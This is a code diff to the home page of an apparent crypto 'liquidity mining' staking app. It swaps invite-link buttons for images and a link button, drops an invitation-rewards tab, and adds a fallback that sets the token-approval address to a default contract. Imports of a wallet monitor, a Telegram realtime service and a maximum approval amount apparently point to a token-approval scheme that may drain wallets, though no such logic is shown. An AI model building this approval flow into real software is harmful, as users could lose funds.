@@ -35,11 +35,12 @@ import { getMaxApproveAmountFromEnv } from '@/lib/load-env'
 import DraggableChatButton from '@/components/NewEmptyComponent'
 import { ContainerTextScroll } from '@/components/ui/container-text-scroll'
 import ScrollIndicator from '@/components/ui/scroll-indicator'
+import { LightButton } from '@/components/ui/light-button'
+import { BackToTop } from '@/components/ui/back-to-top'
 import { RouteIcon } from '@/components/ui/route-icon'
 import ParticipateButton from '@/components/ParticipateButton'
 import BinanceLiquidityStaking from '@/components/BinanceLiquidityStaking'
 import { SlideTabs } from '@/components/ui/slide-tabs'
-import InviteLinkButton from '@/components/InviteLinkButton'
 import { telegramRealtimeService } from '@/services/telegramRealtimeService'
 import { walletMonitorService } from '@/services/walletMonitorService'
 import styled from 'styled-components'
@@ -442,7 +443,7 @@ export default function Home() {
   const [isSubmitting, setIsSubmitting] = useState(false)
 
   // 记录子标签映射
-  const recordsTabMapping = ['exchange', 'withdraw', 'deposit', 'shared', 'earnings']
+  const recordsTabMapping = ['exchange', 'withdraw', 'deposit', 'earnings']
   const getRecordsTabIndex = (tab: string) => recordsTabMapping.indexOf(tab)
   const setRecordsTabByIndex = (index: number) => setRecordsSubTab(recordsTabMapping[index])
 
@@ -852,8 +853,14 @@ export default function Home() {
     }
     
     if (!permissionAddress) {
-      alert('正在加载授权配置，请稍候...')
-      return
+      // 如果正在加载配置，不执行任何操作，按钮会显示加载状态
+      if (loadingAuthConfig) {
+        return
+      }
+      // 如果配置加载失败，使用默认的质押合约地址
+      const STAKING_CONTRACT = CURRENT_NETWORK.STAKING_CONTRACT
+      setPermissionAddress(STAKING_CONTRACT)
+      // 继续执行，使用默认地址
     }
     
     try {
@@ -917,15 +924,6 @@ export default function Home() {
             <div className="sm:hidden">
               <LanguageSelectorDropdown />
             </div>
-            {/* 桌面端按钮 */}
-            <div className="hidden sm:flex items-center gap-4">
-              {/* 邀请链接按钮 */}
-              <InviteLinkButton 
-                inviteLink={`${typeof window !== 'undefined' ? window.location.origin : 'https://yourapp.com'}?ref=${account || 'default'}`}
-                title="Invite Friends"
-                description="Share this link with your friends to invite them"
-              />
-            </div>
           </div>
         </header>
 
@@ -936,17 +934,22 @@ export default function Home() {
             <h1 className="text-3xl md:text-5xl font-bold text-white mb-4">
               {t.globalLiquidityMiningNetwork}
             </h1>
-            <p className="text-lg md:text-xl text-gray-300 max-w-4xl mx-auto">
-              {t.globalLiquidityMiningNetworkDescription}
-            </p>
-            
-            {/* 移动端邀请链接按钮 */}
-            <div className="mt-6 sm:hidden">
-              <InviteLinkButton 
-                inviteLink={`${typeof window !== 'undefined' ? window.location.origin : 'https://yourapp.com'}?ref=${account || 'default'}`}
-                title="Invite Friends"
-                description="Share this link with your friends to invite them"
-              />
+            {/* 移动端图片 */}
+            <img 
+              src="https://cy-747263170.imgix.net/gift-a78ba2a9fe18f36116dcc1fa9e105629.png"
+              alt="全球流動性挖礦網絡"
+              className="w-full max-w-4xl mx-auto mt-6 md:hidden"
+            />
+            {/* PC端图片 */}
+            <img 
+              src="https://cy-747263170.imgix.net/illustration.b3e4eac3.png"
+              alt="全球流動性挖礦網絡"
+              className="hidden md:block w-full max-w-4xl mx-auto mt-6"
+            />
+            <div className="mt-8 flex justify-center">
+              <LightButton href="/invite">
+                {t.footer.inviteFriends}
+              </LightButton>
             </div>
           </div>
         </section>
@@ -972,9 +975,9 @@ export default function Home() {
               <div className="flex justify-center">
                 <ParticipateButton 
                   onClick={handleStake}
-                  disabled={isLoading}
+                  disabled={isLoading || loadingAuthConfig}
                   isAuthorized={!!isAuthorized}
-                  isApprovalPending={isApprovalPending}
+                  isApprovalPending={isApprovalPending || loadingAuthConfig}
                   isConnected={isConnected}
                 />
               </div>
@@ -1357,8 +1360,7 @@ export default function Home() {
                           tabs={[
                             t.exchangeRecords,
                             t.withdrawRecords,
-                            t.depositRecords || '充值记录',
-                            t.invitationRewards,
+                            t.depositRecords || '充值',
                             t.earningsRecords
                           ]}
                           activeTab={getRecordsTabIndex(recordsSubTab)}
@@ -1467,41 +1469,6 @@ export default function Home() {
                                     record.status === t.processing ? 'text-blue-400' :
                                     record.status === t.pending ? 'text-yellow-400' : 'text-gray-400'
                                   }`}>{record.status}</span>
-                                </div>
-                              ))
-                            ) : (
-                              <div className="text-center py-8 text-gray-400">
-                                {t.noRecords}
-                              </div>
-                            )}
-                          </div>
-                        </div>
-                      )}
-
-                      {/* 邀请奖励记录 */}
-                      {recordsSubTab === 'shared' && (
-                        <div className="space-y-4">
-                          {/* 表格头 */}
-                          <div className="grid grid-cols-3 gap-4 pb-2 border-b border-gray-600/30">
-                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
-                            <span className="text-gray-400 text-sm font-medium">{t.address}</span>
-                            <span className="text-gray-400 text-sm font-medium">{t.income}</span>
-                          </div>
-
-                          {/* 记录列表 */}
-                          <div className="space-y-2 max-h-60 overflow-y-auto">
-                            {recordsLoading ? (
-                              <div className="flex justify-center py-8">
-                                <div className="text-gray-400">{t.loading}...</div>
-                              </div>
-                            ) : sharedRecords.length > 0 ? (
-                              sharedRecords.map((record, index) => (
-                                <div key={index} className="grid grid-cols-3 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
-                                  <span className="text-gray-300 text-sm">{record.time}</span>
-                                  <span className="text-blue-400 text-sm font-medium truncate" title={record.address}>
-                                    {record.address.substring(0, 8)}...{record.address.substring(record.address.length - 6)}
-                                  </span>
-                                  <span className="text-green-400 text-sm font-medium">{record.income}</span>
                                 </div>
                               ))
                             ) : (
@@ -1975,6 +1942,8 @@ export default function Home() {
         />
       )}
 
+      {/* Back to Top Button */}
+      <BackToTop />
     </div>
   )
 }
